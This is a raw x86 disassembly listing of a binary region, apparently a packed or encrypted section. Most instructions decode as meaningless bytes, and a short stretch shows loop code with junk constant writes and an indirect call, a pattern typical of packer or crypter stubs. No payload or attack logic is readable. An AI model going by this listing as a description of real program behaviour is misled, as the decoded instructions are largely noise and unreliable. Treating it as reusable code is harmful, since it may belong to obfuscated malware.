  40289c:	dec    ebp
  40289d:	stos   BYTE PTR es:[edi],al
  40289e:	pop    ebp
  40289f:	addr16 pop eax
  4028a1:	mov    edi,eax
  4028a3:	cs xchg ecx,eax
  4028a5:	pop    ebp
  4028a6:	std    
  4028a7:	jns    0x402868
  4028a9:	pop    esp
  4028aa:	sti    
  4028ab:	aad    0x3a
  4028ad:	lods   al,BYTE PTR ds:[esi]
  4028ae:	je     0x4028cb
  4028b0:	pop    ss
  4028b1:	push   ebx
  4028b2:	push   0x4a
  4028b4:	(bad)  
  4028b5:	in     eax,dx
  4028b6:	aas    
  4028b7:	mov    ch,0xf7
  4028b9:	iret   
  4028ba:	jg     0x402870
  4028bc:	mov    ecx,0x2ad188e8
  4028c1:	arpl   WORD PTR ds:0x1d58aa08,cx
  4028c7:	sbb    WORD PTR [eax],bx
  4028ca:	and    eax,0x377cdaab
  4028cf:	pop    esi
  4028d0:	mov    es,edx
  4028d2:	mov    al,0xe2
  4028d4:	inc    ecx
  4028d5:	dec    ebp
  4028d6:	adc    ebp,DWORD PTR [ecx+0x7e13d935]
  4028dc:	xor    al,0xe8
  4028de:	push   ebx
  4028df:	call   0x281ddb12
  4028e4:	jg     0x402951
  4028e6:	and    cl,bl
  4028e8:	outs   dx,DWORD PTR ds:[esi]
  4028e9:	pop    esi
  4028ea:	test   eax,0x7b1f42e2
  4028ef:	lea    eax,[eax]
  4028f1:	imul   ebx,DWORD PTR [esi+0x2b],0xffffff9e
  4028f5:	lods   al,BYTE PTR ds:[esi]
  4028f6:	imul   esp,DWORD PTR [ebx+eax*1+0x22b0a722],0x2a
  4028fe:	push   ecx
  4028ff:	mov    esp,0x8022570e
  402904:	(bad)  
  402905:	mov    dh,0x25
  402907:	imul   ecx,DWORD PTR [edi+0x78],0x882dc3a6
  40290e:	fisub  WORD PTR [ebp-0x25e67b0d]
  402914:	ja     0x4028b7
  402916:	das    
  402917:	adc    BYTE PTR [esi],cl
  402919:	mov    ebp,DWORD PTR [ebx]
  40291b:	ins    BYTE PTR es:[edi],dx
  40291c:	push   0xb389bb1f
  402921:	(bad)  
  402922:	sar    BYTE PTR [esp+eiz*2+0x786132c3],cl
  402929:	fcom   QWORD PTR [edx-0x7e]
  40292c:	dec    edx
  40292d:	xchg   DWORD PTR [edi+0x19b08489],edi
  402933:	sahf   
  402934:	and    ecx,DWORD PTR [edi-0x1]
  402937:	xlat   BYTE PTR ds:[ebx]
  402938:	pop    edi
  402939:	outs   dx,BYTE PTR ds:[esi]
  40293a:	and    al,0xac
  40293c:	adc    edx,DWORD PTR [ebx]
  40293e:	test   BYTE PTR [ecx],bl
  402940:	imul   esi,DWORD PTR [ebp-0x8673aa],0xffffffeb
  402947:	cmp    edi,edx
  402949:	mov    DWORD PTR ds:0x434392,0x545f
  402953:	je     0x40391f
  402959:	and    edx,edx
  40295b:	mov    edx,DWORD PTR [ebp-0x8]
  40295e:	sbb    DWORD PTR ds:0x432dde,0x186f
  402968:	mov    eax,DWORD PTR [ebp-0x4]
  40296b:	xor    eax,ecx
  40296d:	and    DWORD PTR ds:0x43439e,0x0
  402977:	jmp    0x402989
  40297c:	mov    edi,DWORD PTR ds:0x43439e
  402982:	inc    edi
  402983:	mov    DWORD PTR ds:0x43439e,edi
  402989:	cmp    DWORD PTR ds:0x43439e,0x10
  402990:	jae    0x4029c8
  402996:	cmp    DWORD PTR ds:0x43439e,0x14
  40299d:	jne    0x4029c3
  4029a3:	push   DWORD PTR [ebp-0x18]
  4029a6:	push   0x43437e
  4029ab:	push   0x4692
  4029b0:	push   0x432738
  4029b5:	push   DWORD PTR [ebp-0x14]
  4029b8:	push   0x4d96
  4029bd:	call   DWORD PTR ds:0x432cea
  4029c3:	jmp    0x40297c
  4029c8:	mov    edi,0xffcd8d64
  4029cd:	sub    edi,eax
  4029cf:	add    edi,DWORD PTR [ebp+0x10]
  4029d2:	xor    edx,ecx
  4029d4:	adc    DWORD PTR ds:0x432de6,0x432dbe
  4029de:	add    edx,esi
  4029e0:	mov    DWORD PTR ds:0x43436a,0x3472
  4029ea:	cmp    edx,edi
  4029ec:	ja     0x40391a
  4029f2:	push   ebx
  4029f3:	jmp    0x4029fd
  4029f8:	mov    esi,0x32729c
  4029fd:	mov    eax,DWORD PTR [ebp-0x8]
  402a00:	jmp    0x402db6
  402a05:	mov    eax,ds:0x61e6e778
  402a0a:	in     eax,0xa1
  402a0c:	inc    ebx
  402a0d:	sub    BYTE PTR [edi+0x6cb011fc],ah
  402a13:	push   0xffffffaa
  402a15:	add    BYTE PTR [eax+esi*2],cl
  402a18:	jo     0x4029b1
  402a1a:	jge    0x402a8c
  402a1c:	jo     0x402a1a
  402a1e:	add    edi,DWORD PTR [ecx+0x1653c1a3]
  402a24:	ret    0xcca9
  402a27:	call   0xed566c50
  402a2c:	hlt    
  402a2d:	aaa    
  402a2e:	mov    ah,0x92
  402a30:	clc    
  402a31:	and    dh,ch
  402a33:	iret   
  402a34:	sahf   
  402a35:	pop    ebp
  402a36:	adc    al,0xe0
  402a38:	into   
  402a39:	popf   
  402a3a:	stos   DWORD PTR es:[edi],eax
  402a3b:	(bad)  
  402a3c:	mov    cl,0xfa
  402a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a3f:	jne    0x402a5a
  402a41:	xchg   esi,eax
  402a42:	lods   al,BYTE PTR ds:[esi]
  402a43:	pop    ds
  402a44:	in     eax,dx
  402a45:	retf   
  402a46:	mov    ds:0xe1b3d3d,al
  402a4b:	ss sub ah,dl
  402a4e:	mov    bh,0x94
  402a50:	xchg   ebp,eax
  402a51:	fbld   TBYTE PTR [esi+eiz*4-0x273f759f]
  402a58:	out    0x13,al
  402a5a:	ins    BYTE PTR es:[edi],dx
  402a5b:	arpl   WORD PTR [ebp-0x69],di
  402a5e:	(bad)
  402a61:	cli    
  402a62:	or     cl,al
  402a64:	adc    al,0x6a
  402a66:	lea    esi,[esi]
  402a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a69:	(bad)  
  402a6a:	adc    bl,BYTE PTR ds:0xdb8546a8
  402a70:	(bad)  
  402a72:	xlat   BYTE PTR gs:[ebx]
  402a74:	pop    edx
  402a75:	push   0x4ac62c15
  402a7a:	add    BYTE PTR [ebx-0x4a],al
  402a7d:	das    
  402a7e:	shr    DWORD PTR [edi],0xd8
  402a81:	adc    dh,BYTE PTR [esi]
  402a83:	adc    ch,BYTE PTR [eax]
  402a85:	add    eax,0x132c014c
  402a8a:	xchg   ebp,eax
  402a8b:	and    edx,DWORD PTR [edx]
  402a8d:	loope  0x402aad
  402a8f:	retf   
  402a90:	loopne 0x402a7f
  402a92:	in     al,dx
  402a93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a94:	arpl   sp,sp
  402a96:	jge    0x402a95
  402a98:	xchg   BYTE PTR [edi],bh
  402a9a:	(bad)  
  402a9b:	das    
  402a9c:	(bad)  
  402a9d:	adc    DWORD PTR [ecx],esi
  402a9f:	daa    
  402aa0:	sti    
  402aa1:	int    0x3
  402aa3:	add    edx,edi
  402aa5:	pop    ebx
  402aa6:	fstp   st(0)
  402aa8:	ret    
  402aa9:	xchg   edi,eax
  402aaa:	pop    edx
  402aab:	xlat   BYTE PTR ds:[ebx]
  402aac:	fmul   QWORD PTR [esi]
  402aae:	mov    dh,0x91
  402ab0:	sub    ah,bl
  402ab2:	es call 0xb87a3fb8
  402ab8:	sub    BYTE PTR [ebx+0x291815a2],bh
  402abe:	jb     0x402ad6
  402ac0:	enter  0x6c5c,0x6c
  402ac4:	outs   dx,BYTE PTR ds:[esi]
  402ac5:	and    al,0xba
  402ac7:	outs   dx,DWORD PTR ds:[esi]
  402ac8:	xlat   BYTE PTR ds:[ebx]
  402ac9:	cmp    DWORD PTR [ecx],edi
  402acb:	push   0xbeb12976
  402ad0:	lahf   
  402ad1:	outs   dx,DWORD PTR ds:[esi]
  402ad2:	es jg  0x402af0
  402ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ad6:	cli    
  402ad7:	dec    BYTE PTR [ebx]
  402ad9:	add    dh,BYTE PTR [eax+ebp*4]
  402adc:	cmp    eax,0x23c7626f
  402ae1:	scas   eax,DWORD PTR es:[edi]
  402ae2:	shr    DWORD PTR [ecx],1
  402ae4:	add    DWORD PTR [eax-0x32b3c7b],ebp
  402aea:	xor    al,0x64
  402aec:	daa    
  402aed:	pop    ds
  402aee:	push   es
  402aef:	std    
  402af0:	loopne 0x402ad0
  402af2:	xchg   DWORD PTR [eax+eiz*4-0x5b],ebx
  402af6:	test   DWORD PTR [esi-0x1c],edx
  402af9:	cmc    
  402afa:	push   ss
  402afb:	add    BYTE PTR [edx+0x6c],0x96
  402aff:	out    dx,al
  402b00:	mov    eax,ds:0x4b9f2795
  402b05:	scas   al,BYTE PTR es:[edi]
  402b06:	pop    ecx
  402b07:	jmp    0xbdfcbce7
  402b0c:	sub    eax,0x2f469385
  402b11:	nop
  402b12:	xchg   ebx,eax
  402b13:	adc    cl,bl
  402b15:	hlt    
  402b16:	imul   esp,DWORD PTR [ecx-0x6d],0x61
  402b1a:	fisubr WORD PTR [ecx]
  402b1c:	sub    DWORD PTR [eax],esi
  402b1e:	std    
  402b1f:	dec    edi
  402b20:	gs retw 0xa9e0
  402b25:	fprem1 
  402b27:	jne    0x402b42
  402b29:	repnz out 0x69,al
  402b2c:	push   ebx
  402b2d:	gs pop esp
  402b2f:	pop    ebp
  402b30:	lock into 
  402b32:	push   ebp
  402b33:	push   esi
  402b34:	jae    0x402bb1
  402b36:	mov    ds:0xe4a6eb5d,al
  402b3b:	xor    cl,BYTE PTR [edi]
  402b3d:	(bad)  
  402b3f:	and    edx,DWORD PTR [ebx+0x4]
  402b42:	sbb    al,0xd0
  402b44:	push   ebp
  402b45:	mov    ecx,0xf8737086
  402b4a:	cmp    BYTE PTR ds:[eax+0x5a],bl
  402b4e:	cmp    bl,BYTE PTR [eax+0x16]
  402b51:	pop    es
  402b52:	ret    
  402b53:	test   eax,0xb0735bc6
  402b58:	rcr    edi,0xb1
  402b5b:	inc    esi
  402b5c:	jecxz  0x402b56
  402b5e:	imul   esp,DWORD PTR [edx-0x624b128c],0x6c
  402b65:	loopne 0x402bc1
  402b67:	jne    0x402bdb
  402b69:	enter  0xd246,0x2d
  402b6d:	or     eax,0xf979441e
  402b72:	lea    edx,[esi+0x665704a2]
  402b78:	pusha  
  402b79:	scas   eax,DWORD PTR es:[edi]
  402b7a:	mov    ebp,0x9a836854
  402b7f:	xchg   edx,eax
  402b80:	in     al,dx
  402b81:	idiv   DWORD PTR [edi]
  402b83:	out    dx,eax
  402b84:	enter  0xb10d,0x97
  402b88:	mov    dl,0x91
  402b8a:	dec    esi
  402b8b:	pushf  
  402b8c:	jecxz  0x402bed
  402b8e:	fstp   TBYTE PTR [edx-0x21]
  402b91:	mov    WORD PTR [ecx+ebp*4+0x5e],?
  402b95:	lods   al,BYTE PTR ds:[esi]
  402b96:	pushf  
  402b97:	push   cs
  402b98:	adc    cl,BYTE PTR [edx+0x92a1c52]
  402b9e:	or     al,0x9d
  402ba0:	stos   DWORD PTR es:[edi],eax
  402ba1:	frstor [edx]
  402ba3:	jae    0x402bb6
  402ba5:	mov    eax,0xe316a819
  402baa:	pushf  
  402bab:	stos   DWORD PTR es:[edi],eax
  402bac:	pop    ecx
  402bad:	pop    ds
  402bae:	cmp    eax,0xdb60d158
  402bb3:	sbb    eax,DWORD PTR cs:[eax]
  402bb6:	jecxz  0x402c31
  402bb8:	push   esp
  402bb9:	adc    cl,bh
  402bbb:	xlat   BYTE PTR ds:[ebx]
  402bbc:	push   ecx
  402bbd:	lods   eax,DWORD PTR ds:[esi]
  402bbe:	sbb    DWORD PTR [esi],edi
  402bc0:	mov    cl,0xcd
  402bc2:	jmp    0x402c2f
  402bc4:	pop    edi
  402bc5:	fdiv   QWORD PTR [esi]
  402bc7:	jecxz  0x402b8d
  402bc9:	clc    
  402bca:	xchg   edi,eax
  402bcb:	mov    ds:0xf4e74364,eax
  402bd0:	aam    0x94
  402bd2:	adc    esi,DWORD PTR [eax]
  402bd4:	jmp    0xa2f875b2
  402bd9:	jge    0x402b6e
  402bdb:	lahf   
  402bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bdd:	or     cl,BYTE PTR es:[edi-0x1a516a02]
  402be4:	retf   
  402be5:	mov    eax,0xd16ce6fa
  402bea:	xchg   ebp,eax
  402beb:	mov    ah,0x6d
  402bed:	aad    0xec
  402bef:	daa    
  402bf0:	les    ecx,FWORD PTR [eax-0x6c65713c]
  402bf6:	es aas 
  402bf8:	clc    
  402bf9:	push   ecx
  402bfa:	pop    ecx
  402bfb:	enter  0x98e5,0x10
  402bff:	shl    esp,1
  402c01:	outs   dx,BYTE PTR ds:[esi]
  402c02:	test   eax,0xc670c768
  402c07:	fwait
  402c08:	and    esi,eax
  402c0a:	in     eax,dx
  402c0b:	and    DWORD PTR [edx+ebx*1+0x649d1fb6],esp
  402c12:	mov    cl,0x2b
  402c14:	hlt    
  402c15:	clc    
  402c16:	and    al,0xc2
  402c18:	xchg   edx,eax
  402c19:	mov    al,0x8
  402c1b:	or     al,BYTE PTR [ebp-0x3c]
  402c1e:	add    al,BYTE PTR [esi]
  402c20:	in     al,0x60
  402c22:	dec    eax
  402c23:	(bad)  
  402c24:	ins    DWORD PTR es:[edi],dx
  402c25:	sub    al,0x2b
  402c27:	test   al,0x91
  402c29:	cmc    
  402c2a:	mov    ebp,?
  402c2c:	lock scas al,BYTE PTR es:[edi]
  402c2e:	inc    edx
  402c2f:	les    edx,FWORD PTR [edi+0x3988e3b5]
  402c35:	leave  
  402c36:	xor    dh,BYTE PTR [edi-0x28]
  402c39:	add    al,0xe9
  402c3b:	fisttp QWORD PTR [edi+0x34]
  402c3e:	sbb    al,BYTE PTR [edx+0x2e69a301]
  402c44:	ss scas al,BYTE PTR es:[edi]
  402c46:	lahf   
  402c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c48:	test   BYTE PTR [ecx-0x673da93],bl
  402c4e:	adc    al,ah
  402c50:	dec    eax
  402c51:	rcl    BYTE PTR [edi-0x55eef237],1
  402c57:	sbb    al,0xea
  402c59:	daa    
  402c5a:	jge    0x402cae
  402c5c:	jb     0x402c89
  402c5e:	and    DWORD PTR [esp+ebx*4+0x4a0536e1],ebx
  402c65:	mov    BYTE PTR [bp-0x57],al
  402c69:	mov    esp,0xb16226b8
  402c6e:	mov    BYTE PTR [edi-0x54],dh
  402c71:	inc    ebp
  402c72:	mov    ds:0x59c3dc50,al
  402c77:	add    BYTE PTR [esi+0x615da38e],dl
  402c7d:	out    dx,al
  402c7e:	add    eax,0x97a22bd7
  402c83:	mov    edi,0x272ab02d
  402c88:	jp     0x402c78
  402c8a:	mov    al,ds:0x61ea64f9
  402c8f:	pop    ebp
  402c90:	add    BYTE PTR [ebx+0x37],cl
  402c93:	fild   WORD PTR [eax+0x45]
  402c96:	sub    dl,BYTE PTR [edx+0x79cf12d2]
  402c9c:	mov    WORD PTR [edx+0x67],?
  402c9f:	mov    al,ds:0x7cd30eb4
  402ca4:	in     al,dx
  402ca5:	clc    
  402ca6:	sar    BYTE PTR [esp+ecx*1+0x40],cl
  402caa:	fs dec edx
  402cac:	retf   
  402cad:	jbe    0x402d1b
  402caf:	icebp  
  402cb0:	mov    dh,ah
  402cb2:	xor    ecx,esp
  402cb4:	add    eax,0x80b26dfc
  402cb9:	int    0xe5
  402cbb:	(bad)  
  402cbc:	jl     0x402cff
  402cbe:	dec    eax
  402cbf:	jg     0x402d04
  402cc1:	rcl    BYTE PTR [ecx+0x79],cl
  402cc4:	jle    0x402cb4
  402cc6:	mov    BYTE PTR [ebx-0xb9574da],al
  402ccc:	push   cs
  402ccd:	xlat   BYTE PTR ds:[ebx]
  402cce:	test   dh,dh
  402cd0:	mov    al,ds:0x9a067464
  402cd5:	lds    ebp,FWORD PTR [edi]
  402cd7:	mov    edi,DWORD PTR [eax+0x71194afe]
  402cdd:	adc    al,0xe
  402cdf:	aad    0x93
  402ce1:	push   ebp
  402ce2:	mov    esi,0x9518a20f
  402ce7:	jl     0x402d13
  402ce9:	popa   
  402cea:	nop
  402ceb:	iret   
  402cec:	and    esi,DWORD PTR [ebx-0x58]
  402cef:	inc    ecx
  402cf0:	dec    ebp
  402cf1:	add    BYTE PTR [ebx-0x22],al
  402cf4:	xor    bl,ch
  402cf6:	cmp    DWORD PTR [edx-0x5aaf6bef],ebx
  402cfc:	ins    BYTE PTR es:[edi],dx
  402cfd:	pop    ds
  402cfe:	pop    edx
  402cff:	push   edi
  402d00:	xor    DWORD PTR [eax-0xcdffc06],edi
  402d06:	ss cmp eax,0xbb52cfc4
  402d0c:	sbb    eax,0xfcfd3f26
  402d11:	push   ebx
  402d12:	jbe    0x402d4e
  402d14:	aad    0xd2
  402d16:	pop    ebp
  402d17:	ficomp WORD PTR [ecx]
  402d19:	imul   esp,DWORD PTR [ecx+0x661ed1ba],0xffffffd9
  402d20:	scas   eax,DWORD PTR es:[edi]
  402d21:	xor    BYTE PTR [ebp+0x7729d732],0xcb
  402d28:	or     DWORD PTR [esi],esi
  402d2a:	and    dh,bl
  402d2c:	(bad)  
  402d2d:	inc    DWORD PTR [ecx-0x1049f1f5]
  402d33:	dec    ebp
  402d34:	jmp    0x402d7b
  402d36:	retf   
  402d37:	or     dl,BYTE PTR [ecx+0x1]
  402d3a:	scas   eax,DWORD PTR es:[edi]
  402d3b:	fwait
  402d3c:	pop    ss
  402d3d:	mov    al,ds:0x42d61fc
  402d42:	pop    ecx
  402d43:	and    eax,0x2a73b8a4
  402d48:	loopne 0x402daf
  402d4a:	jge    0x402dc8
  402d4c:	push   ebx
  402d4d:	popf   
  402d4e:	test   eax,0x15425da9
  402d53:	xchg   ebx,eax
  402d54:	je     0x402d0c
  402d56:	inc    esp
  402d57:	sub    eax,0x91354112
  402d5c:	add    BYTE PTR [esi+0x6e6a594a],dh
  402d62:	addr16 cld 
  402d64:	dec    esi
  402d65:	push   esi
  402d66:	pop    ebp
  402d67:	mov    ch,cl
  402d69:	xchg   dl,dh
  402d6b:	push   0x25
  402d6d:	xor    ecx,DWORD PTR [esi+0x10]
  402d70:	enter  0x7e44,0x1a
  402d74:	fstp   QWORD PTR [edx-0x251ec205]
  402d7a:	lods   eax,DWORD PTR ds:[esi]
  402d7c:	adc    al,0x1f
  402d7e:	out    0xf6,al
  402d80:	out    0x4f,eax
  402d82:	pop    ecx
  402d83:	push   cs
  402d84:	gs jge 0x402d0f
  402d87:	or     ebx,DWORD PTR [ebx+0x57]
  402d8a:	out    0x47,eax
  402d8c:	mov    dh,0xcc
  402d8e:	cmp    eax,0x599d3180
  402d93:	or     DWORD PTR [ebx-0x608ee42a],edi
  402d99:	mov    dh,0xe0
  402d9b:	sub    DWORD PTR [edx-0x62],eax
  402d9e:	push   ss
  402d9f:	mov    dh,0xfb
  402da1:	ins    DWORD PTR es:[edi],dx
  402da2:	into   
  402da3:	mov    edi,0xef92a8ad
  402da8:	lods   eax,DWORD PTR ds:[esi]
  402da9:	dec    ecx
  402daa:	test   al,0xe7
  402dac:	call   0x5b00119d
  402db1:	inc    esi
  402db2:	cli    
  402db3:	sub    DWORD PTR ds:[edi-0x75],esi
  402db7:	jge    0x402db5
  402db9:	jmp    0x40316f
  402dbe:	cs out dx,eax
  402dc0:	loopne 0x402e3e
  402dc2:	in     eax,dx
  402dc3:	jnp    0x402daf
  402dc5:	jmp    0x3c56257c
  402dca:	xchg   DWORD PTR [eax+0x9a7e2b2],eax
  402dd0:	jo     0x402e42
  402dd2:	xchg   edi,eax
  402dd3:	jge    0x402e45
  402dd5:	jo     0x402e17
  402dd7:	or     DWORD PTR fs:[edx-0x5f9d5cd0],ebx
  402dde:	pop    edi
  402ddf:	daa    
  402de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402de1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402de2:	cmp    DWORD PTR ds:[ecx],0x9cf5eae2
  402de9:	cwde   
  402dea:	mov    ecx,0x1e303c74
  402def:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402df0:	adc    BYTE PTR [eax],al
  402df2:	sub    esi,DWORD PTR [edi]
  402df4:	mov    ah,0x37
  402df6:	cwde   
  402df7:	gs or  al,0xaa
  402dfa:	xchg   edx,eax
  402dfb:	popf   
  402dfc:	sub    DWORD PTR ds:0x57892ac8,ecx
  402e02:	cmp    al,0xed
  402e04:	mov    ebx,0x51f0c888
  402e09:	icebp  
  402e0a:	lahf   
  402e0b:	mov    DWORD PTR [ebp*4+0x380bbf29],esi
  402e12:	jecxz  0x402da5
  402e14:	sbb    eax,0x7478b9f3
  402e19:	(bad)  
  402e1a:	call   0x3bf5:0xcec77e6b
  402e21:	cmp    eax,0x9c14c526
  402e26:	ret    
  402e27:	(bad)  
  402e28:	cli    
  402e29:	int3   
  402e2a:	gs jle 0x402de0
  402e2d:	sbb    bl,ah
  402e2f:	clc    
  402e30:	add    eax,0x3ce2798a
  402e35:	and    DWORD PTR [esi],esi
  402e37:	and    DWORD PTR [edx+0x63],esi
  402e3a:	jnp    0x402e3b
  402e3c:	(bad)  
  402e3e:	mov    esp,DWORD PTR ds:0xafff6881
  402e44:	arpl   WORD PTR [ebx-0x18],si
  402e47:	fs sbb eax,0xfe643386
  402e4d:	or     al,BYTE PTR ds:[ebx+0x75]
  402e51:	es cmp al,0xf6
  402e54:	xchg   edi,eax
  402e55:	stc    
  402e56:	rcl    BYTE PTR [ebx],0x7b
  402e59:	aas    
  402e5a:	(bad)  
  402e5b:	imul   ebp,DWORD PTR [ebp+0x50f358b8],0x257b05b4
  402e65:	cmc    
  402e66:	icebp  
  402e67:	ror    DWORD PTR [ebp-0xc],0x80
  402e6b:	lods   eax,DWORD PTR ds:[esi]
  402e6c:	popf   
  402e6d:	dec    esp
  402e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e6f:	sub    BYTE PTR [ebx-0x56],bl
  402e72:	dec    esi
  402e73:	sti    
  402e74:	fmul   st(7),st
  402e76:	dec    edx
  402e77:	ja     0x402e19
  402e79:	pop    edi
  402e7a:	jmp    0x3240:0x79a24fd9
  402e81:	stc    
  402e82:	xchg   esp,eax
  402e83:	sub    al,0x29
  402e85:	mov    edi,0x53ec28d0
  402e8a:	push   edx
  402e8b:	fldenv [ecx+0x31d4504e]
  402e91:	xchg   DWORD PTR [edx-0x66],ebx
  402e94:	pushf  
  402e95:	xor    al,0x63
  402e97:	or     eax,0x5d35766c
  402e9c:	mov    dl,0xcf
  402e9e:	mov    ecx,0x25e72136
  402ea3:	pop    eax
  402ea4:	jg     0x402e3c
  402ea6:	addr16 fs cwde 
  402ea9:	dec    esp
  402eaa:	arpl   WORD PTR [ebx],ax
  402eac:	sub    eax,0xabbbfa7
  402eb1:	and    eax,0x56958969
  402eb6:	cdq    
  402eb7:	jbe    0x402f33
  402eb9:	gs pop ebp
  402ebb:	out    0x4e,al
  402ebd:	inc    edi
  402ebe:	cmp    eax,0x1b6aff9c
  402ec3:	fld    DWORD PTR [ecx-0x4d]
  402ec6:	je     0x402f04
  402ec8:	xchg   esp,eax
  402ec9:	sbb    al,0xe4
  402ecb:	lods   eax,DWORD PTR ds:[esi]
  402ecc:	stos   BYTE PTR es:[edi],al
  402ecd:	pusha  
  402ece:	mov    BYTE PTR [edi+0x24],ah
  402ed1:	or     al,0xc1
  402ed3:	jae    0x402f02
  402ed5:	add    DWORD PTR [edi+0x2e71c4c9],ebp
  402edb:	fist   DWORD PTR [edx]
  402edd:	xchg   ebx,eax
  402ede:	sbb    eax,0x93d7dca0
  402ee3:	jmp    0xaa4ebe3d
  402ee8:	push   eax
  402ee9:	xor    edx,DWORD PTR [edi+0x6cc697b0]
  402eef:	pop    ecx
  402ef0:	dec    esi
  402ef1:	mov    ebp,0x7a582fea
  402ef6:	fdivrp st(0),st
  402ef8:	push   es
  402ef9:	mov    ds:0xa7dbb275,eax
  402efe:	enter  0x4480,0x2e
  402f02:	shl    BYTE PTR [esi-0xa79b824],cl
  402f08:	push   eax
  402f09:	lahf   
  402f0a:	or     cl,BYTE PTR es:[edx+ebp*1-0x6e]
  402f0f:	sub    esp,DWORD PTR [edi]
  402f11:	pop    ds
  402f12:	jge    0x402f2d
  402f14:	ror    DWORD PTR ds:0x1a544ed5,1
  402f1a:	and    DWORD PTR [edx-0x36],esp
  402f1d:	loope  0x402ea0
  402f1f:	adc    BYTE PTR [esp+edx*1-0x757e883c],dh
  402f26:	cmc    
  402f27:	adc    ah,BYTE PTR [edx-0x3cc28f42]
  402f2d:	xor    eax,0x3dffc01d
  402f32:	xlat   BYTE PTR ds:[ebx]
  402f33:	or     BYTE PTR [edi*2+0x11af6ff7],cl
  402f3a:	imul   edi,DWORD PTR [ebx+ebx*8],0xffffffcf
  402f3e:	loopne 0x402f66
  402f40:	repnz in eax,dx
  402f42:	stos   DWORD PTR es:[edi],eax
  402f43:	dec    esi
  402f44:	add    esi,DWORD PTR [edx-0xe031f42]
  402f4a:	scas   al,BYTE PTR es:[edi]
  402f4b:	and    ebx,esi
  402f4d:	loope  0x402f60
  402f4f:	lock push edi
  402f51:	pop    ss
  402f52:	or     dh,BYTE PTR [eax]
  402f54:	repnz dec esi
  402f56:	aas    
  402f57:	cmp    al,0x20
  402f5a:	sub    BYTE PTR [ecx-0x457ee166],dh
  402f60:	xor    al,BYTE PTR [eax+esi*4-0x76]
  402f64:	out    0xd6,al
  402f66:	mov    esi,0x61e5c57f
  402f6b:	mov    bl,ch
  402f6d:	push   ecx
  402f6e:	bnd jbe 0x402f71
  402f71:	push   ss
  402f72:	or     edx,ebp
  402f74:	(bad)  
  402f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f77:	push   ds
  402f78:	xlat   BYTE PTR ds:[ebx]
  402f79:	mul    BYTE PTR [ebx-0x738f684b]
  402f7f:	clc    
  402f80:	mov    bh,0xc1
  402f82:	shr    DWORD PTR [edi],cl
  402f84:	cmc    
  402f85:	loopne 0x402fc9
  402f87:	cwde   
  402f88:	pushf  
  402f89:	sbb    al,0xc1
  402f8b:	pop    ebx
  402f8c:	dec    esp
  402f8d:	retf   
  402f8e:	or     dh,bh
  402f90:	pop    edi
  402f91:	add    ch,bh
  402f93:	sub    DWORD PTR [eax-0x37],0xbf2fb1d2
  402f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f9b:	mov    ebp,0x7594b93a
  402fa0:	ss push eax
  402fa2:	outs   dx,DWORD PTR ds:[esi]
  402fa3:	or     al,0x26
  402fa5:	fcomp  DWORD PTR [edi]
  402fa7:	cmp    DWORD PTR [esi+0x8],0xd279c393
  402fae:	nop
  402faf:	shr    BYTE PTR [edi-0x52],0x56
  402fb3:	cmp    dh,ah
  402fb5:	jae    0x402fdf
  402fb7:	xor    DWORD PTR [ebx+esi*2-0x239ffaa4],0xcf75ac62
  402fc2:	mov    DWORD PTR [edi],edi
  402fc4:	fldenv [edi-0x6]
  402fc7:	mov    WORD PTR [eax],cs
  402fc9:	ja     0x402f5b
  402fcb:	cmp    al,0x14
  402fcd:	xor    al,0xbb
  402fcf:	xchg   edx,eax
  402fd0:	sub    al,0x1c
  402fd2:	in     eax,dx
  402fd3:	not    esi
  402fd5:	mov    dh,0x71
  402fd7:	pop    edx
  402fd8:	ins    DWORD PTR es:[edi],dx
  402fd9:	xchg   ebx,eax
  402fda:	out    0x5b,eax
  402fdc:	inc    ebx
  402fdd:	(bad)  
  402fde:	repz cmp dh,bl
  402fe1:	out    dx,al
  402fe2:	jmp    0x37ce:0xfef3ede0
  402fe9:	or     ecx,DWORD PTR [ebp+0x30b6ef08]
  402fef:	dec    BYTE PTR [esi]
  402ff1:	dec    esp
  402ff2:	pushf  
  402ff3:	mov    esp,0x9b3b4886
  402ff8:	loope  0x40301b
  402ffa:	vmaxsd xmm0{k4},xmm5,QWORD PTR [edx+0x6f820241]
  403004:	in     al,0x1a
  403006:	mov    eax,ds:0xe1a45965
  40300b:	js     0x403039
  40300d:	push   ebp
  40300e:	inc    eax
  40300f:	and    dl,BYTE PTR [edi-0x31]
  403012:	add    ebx,eax
  403014:	fsubr  st,st(2)
  403016:	fsub   DWORD PTR [ebp-0x7c]
  403019:	xchg   ebx,eax
  40301a:	jge    0x403063
  40301c:	sub    ah,BYTE PTR [ebp+0x71]
  40301f:	jp     0x403020
  403021:	retf   0x61ef
  403024:	aam    0x1f
  403026:	push   es
  403027:	das    
  403028:	aad    0xa
  40302a:	mov    es,edx
  40302c:	push   0xffffffe6
  40302e:	sbb    eax,DWORD PTR [edx+0x6eb93241]
  403034:	inc    ebp
  403035:	stc    
  403036:	call   0x1ca6475e
  40303b:	call   0x2784c6dc
  403040:	mov    esp,0xf0001525
  403045:	cdq    
  403046:	mov    eax,0xf056dfa0
  40304b:	or     DWORD PTR [edx],esp
  40304d:	adc    bl,bl
  40304f:	mov    ebx,0xb044bee9
  403054:	sar    DWORD PTR ds:0xacd1ce0,1
  40305a:	pop    DWORD PTR [ecx+0x1a]
  40305d:	cdq    
  40305e:	jno    0x403017
  403060:	(bad)  
  403061:	pop    ecx
  403062:	and    DWORD PTR es:[eax-0x7d60bf79],0xa771bc56
  40306d:	mov    BYTE PTR [ecx-0x57001789],bh
  403073:	mov    al,0x62
  403075:	sub    BYTE PTR [esi],dh
  403077:	push   esp
  403078:	ficomp DWORD PTR [edx]
  40307a:	sub    eax,0x251b79c4
  40307f:	sbb    DWORD PTR [ecx],edi
  403081:	loope  0x403054
  403083:	rcl    BYTE PTR [edx],1
